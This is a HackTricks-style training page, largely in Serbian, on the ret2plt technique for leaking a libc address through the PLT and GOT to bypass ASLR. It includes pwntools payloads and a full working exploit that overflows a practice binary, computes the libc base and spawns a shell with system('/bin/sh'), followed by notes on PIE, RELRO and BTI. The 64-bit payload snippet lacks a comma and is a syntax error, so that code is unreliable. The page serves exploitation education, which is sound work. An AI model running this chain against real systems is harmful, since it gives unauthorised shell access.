# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Osnovne informacije

Cilj ove tehnike je da **leak an address from a function from the PLT** kako bi se zaobišao ASLR. To je zato što, na primer, ako leak-uješ adresu funkcije `puts` iz libc, možeš onda da **izračunaš gde je baza `libc`** i izračunaš offsets da pristupiš drugim funkcijama kao što je **`system`**.

Ovo se može uraditi pomoću `pwntools` payload-a kao što je ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Obratite pažnju kako se **`puts`** (koristeći adresu iz PLT) poziva sa adresom `puts` koja se nalazi u GOT (Global Offset Table). To je zato što, kada `puts` odštampa GOT unos za puts, taj **unos će sadržati tačnu adresu `puts` u memoriji**.

Takođe, obratite pažnju na to kako se adresa `main` koristi u exploit-u, tako da kada `puts` završi izvršavanje, **binary ponovo poziva `main` umesto da izlazi** (tako da će leaked adresa ostati važeća).

> [!CAUTION]
> Imajte na umu da bi ovo funkcionisalo samo ako binary nije kompajliran sa PIE, ili ako ste pronašli leak koji omogućava zaobilaženje PIE kako biste znali adresu PLT, GOT i main. U suprotnom, prvo morate zaobići PIE.

You can find a [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Ovo je bio finalni exploit iz tog **primera**:

<details>
<summary>Kompletan primer exploita (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Modern considerations

- **`-fno-plt` builds** (common in modern distros) zamenjuju `call foo@plt` sa `call [foo@got]`. Ako binar nema `foo@plt` stub, i dalje možete leak-ovati rešenu adresu sa `puts(elf.got['foo'])` i onda **se vratiti direktno na GOT entry** (`flat(padding, elf.got['foo'])`) da skočite u libc kada lazy binding završi.
- **Full RELRO / `-Wl,-z,now`**: GOT je samo za čitanje ali ret2plt i dalje radi za leak-ove zato što samo čitate GOT slot. Ako simbol nikada nije pozvan, vaš prvi ret2plt će takođe izvršiti lazy binding i potom ispisati rešeni slot.
- **ASLR + PIE**: ako je PIE omogućen, prvo leak-ujte code pointer (npr. sačuvanu return adresu, function pointer, ili `.plt` entry putem drugog format‑string/infoleak) da izračunate PIE bazu, pa onda napravite ret2plt lanac sa rebased PLT/GOT adresama.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT entries su validni BTI landing pads (`bti c`), pa pri exploitovanju BTI‑omogućenih binarnih fajlova preferirajte skok u PLT stub (ili neki drugi BTI‑annotated gadget) umesto direktnog skoka u libc gadget bez BTI, inače će CPU podići `BRK`/`PAC` greške.
- **Quick resolution helper**: ako target funkcija još nije resolved i trebate leak u jednom potezu, chain-ujte PLT poziv dvaput: prvo `elf.plt['foo']` (da se resolve-uje) pa ponovo `elf.plt['foo']` sa GOT adresom kao argumentom da ispiše sada popunjen slot.

## Other examples & References

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, prvi korak je da popunite overflow do bajta 0x00 canary‑ja da biste potom pozvali puts i leak‑ovali ga. Sa canary‑jem se kreira ROP gadget koji poziva puts da leak‑uje adresu puts iz GOT‑a i zatim ROP gadget koji poziva `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, stack overflow u main iz child funkcije. ROP gadget koji poziva puts da leak‑uje adresu puts iz GOT‑a i potom poziva one gadget.

## References

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
